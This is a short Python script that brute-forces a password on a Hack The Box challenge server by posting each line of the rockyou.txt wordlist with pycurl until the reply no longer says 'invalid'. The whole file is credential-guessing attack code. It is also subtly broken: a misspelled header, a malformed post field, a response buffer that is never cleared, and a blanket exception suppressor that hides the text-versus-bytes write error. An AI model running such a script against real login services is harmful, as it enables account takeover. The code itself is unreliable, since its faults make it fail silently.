import pycurl
import io
from contextlib import suppress

response = io.StringIO()
check = "invalid"#.encode('utf-8')

#read rockyou.txt
#for string in rockyou.txt, run CURL against side
f = open("rockyou.txt")
with suppress(Exception):
    for s in f:
        #create a curl
        c = pycurl.Curl()
        c.setopt(c.URL, 'http://docker.hackthebox.eu:51218/')
        c.setopt(c.HTTPHEADER, ['Context-Type: application/json','Accept-Charset: UTF-8'])
        #set the next password testing parameter
        c.setopt(c.POSTFIELDS, '@password.' + s)
        #tell c to write to response
        c.setopt(c.WRITEFUNCTION, response.write)
        #perform the cURL
        c.perform()
        #retrieve the response and close it
        result = response.getvalue()
        print(result)
        
        if check not in result and len(result) > 0:
            print("The password is: " + s)
            break
